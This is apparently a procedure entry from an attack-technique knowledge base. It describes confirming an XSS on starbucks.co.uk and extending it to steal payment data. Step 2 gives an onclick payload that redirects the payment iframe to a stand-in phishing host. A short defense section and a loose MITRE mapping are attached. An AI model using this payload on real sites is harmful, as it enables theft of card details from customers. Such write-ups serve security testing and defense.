---
id: proc-starbucks-xss-validate
tags:
  - xss
  - exfiltration
  - phishing
type: procedure
tools:
  - '[[tools/Firefox]]'
tactics:
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[Archive via Utility]]'
updated_at: '2025-12-13T23:52:21.129Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Archive via Utility]]'
---
# Validate-XSS-Execution-and-Exfiltration

## Summary

This procedure confirms XSS execution via the confirmation prompt and outlines extension to exfiltrate payment data by redirecting the credit card iframe to a phishing site.

## Description

The injected confirm() displays the domain, proving execution. In a full attack, replace with code to overlay or redirect the payment iframe, capturing form submissions due to the lack of CSRF on related actions.

## Requirements

1. Successful trigger from previous step.
2. Firefox for observation.
3. Knowledge of iframe elements on payment page.

## Defense

Defensive measures and detection strategies:

- Monitor for anomalous JavaScript alerts or iframe changes.
- Use Content Security Policy (CSP) to restrict redirects.

## Objectives

1. Verify JavaScript control.
2. Demonstrate data theft potential.
3. Highlight impact on sensitive forms.

## Instructions

### Step 1: Observe Confirmation Prompt

**Context**: Check for execution indicator.

After click, view the alert.

> Expected output: Prompt shows 'www.starbucks.co.uk', confirming domain access.

### Step 2: Extend to Phishing

**Context**: Simulate exfiltration.

Modify payload to: onclick="var iframe = document.querySelector('iframe[src*="payment"]'); iframe.src = 'https://phish-site.com';"

> Expected output: Iframe redirects; form data could be captured in real exploit.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]] Collection

### Techniques

- [[JavaScript]] JavaScript
- [[Archive via Utility]] Archive Collected Data via Web Service (for phishing exfil)

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Firefox]]

## Tags

- [[xss]]
- [[Exfiltration]]
- [[Phishing]]
